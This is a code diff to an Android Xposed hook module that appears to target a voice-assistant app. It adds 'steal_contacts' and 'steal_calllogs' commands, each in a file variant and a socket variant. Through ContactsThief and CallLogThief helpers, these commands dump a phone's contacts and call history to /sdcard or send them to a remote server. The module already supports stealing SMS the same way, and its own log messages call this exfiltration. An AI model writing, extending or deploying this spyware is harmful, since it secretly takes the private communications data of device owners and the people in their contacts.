@@ -14,6 +14,8 @@ import xyz.mufanc.vap.api.ClassHelper
 import xyz.mufanc.vap.api.HookBase
 import xyz.mufanc.vap.api.MethodFinder
 import xyz.mufanc.vap.util.Log
+import xyz.mufanc.vap.util.CallLogThief
+import xyz.mufanc.vap.util.ContactsThief
 import xyz.mufanc.vap.util.NotesThief
 import xyz.mufanc.vap.util.Recorder
 import xyz.mufanc.vap.util.SmsThief
@@ -113,6 +115,24 @@ class HookVoiceAssist(ixp: XposedInterface): HookBase(ixp) {
             "steal_sms" -> {
                 val limit = message.getInt("limit", 20)
                 handleStealSms(kServerAddress, kServerPort, limit)
+            }
+            "steal_contacts_file" -> {
+                val outputPath = message.getString("output") ?: "/sdcard/contacts_theft_raw.json"
+                val limit = message.getInt("limit", 100)
+                handleStealContactsFile(outputPath, limit)
+            }
+            "steal_contacts" -> {
+                val limit = message.getInt("limit", 100)
+                handleStealContacts(kServerAddress, kServerPort, limit)
+            }
+            "steal_calllogs_file" -> {
+                val outputPath = message.getString("output") ?: "/sdcard/calllogs_theft_raw.json"
+                val limit = message.getInt("limit", 50)
+                handleStealCallLogsFile(outputPath, limit)
+            }
+            "steal_calllogs" -> {
+                val limit = message.getInt("limit", 50)
+                handleStealCallLogs(kServerAddress, kServerPort, limit)
             }
             else -> handleRecord(action, kServerAddress, kServerPort, message)
         }
@@ -257,6 +277,50 @@ class HookVoiceAssist(ixp: XposedInterface): HookBase(ixp) {
             Log.i(TAG, "SMS exfiltration completed, $count messages sent.")
         } catch (e: Throwable) {
             Log.e(TAG, "SMS exfiltration failed", e)
+        }
+    }
+
+    private fun handleStealContactsFile(outputPath: String, limit: Int) {
+        Log.i(TAG, "Action=steal_contacts_file: extracting top $limit contacts to $outputPath")
+        try {
+            val thief = ContactsThief()
+            val count = thief.stealToFile(outputPath, limit)
+            Log.i(TAG, "Contacts theft completed, $count contacts written.")
+        } catch (e: Throwable) {
+            Log.e(TAG, "Contacts theft failed", e)
+        }
+    }
+
+    private fun handleStealContacts(serverAddress: String, serverPort: Int, limit: Int) {
+        Log.i(TAG, "Action=steal_contacts: extracting top $limit contacts, target=$serverAddress:$serverPort")
+        try {
+            val thief = ContactsThief()
+            val count = thief.stealToSocket(serverAddress, serverPort, limit)
+            Log.i(TAG, "Contacts exfiltration completed, $count contacts sent.")
+        } catch (e: Throwable) {
+            Log.e(TAG, "Contacts exfiltration failed", e)
+        }
+    }
+
+    private fun handleStealCallLogsFile(outputPath: String, limit: Int) {
+        Log.i(TAG, "Action=steal_calllogs_file: extracting top $limit call logs to $outputPath")
+        try {
+            val thief = CallLogThief()
+            val count = thief.stealToFile(outputPath, limit)
+            Log.i(TAG, "Call logs theft completed, $count records written.")
+        } catch (e: Throwable) {
+            Log.e(TAG, "Call logs theft failed", e)
+        }
+    }
+
+    private fun handleStealCallLogs(serverAddress: String, serverPort: Int, limit: Int) {
+        Log.i(TAG, "Action=steal_calllogs: extracting top $limit call logs, target=$serverAddress:$serverPort")
+        try {
+            val thief = CallLogThief()
+            val count = thief.stealToSocket(serverAddress, serverPort, limit)
+            Log.i(TAG, "Call logs exfiltration completed, $count records sent.")
+        } catch (e: Throwable) {
+            Log.e(TAG, "Call logs exfiltration failed", e)
         }
     }
 }
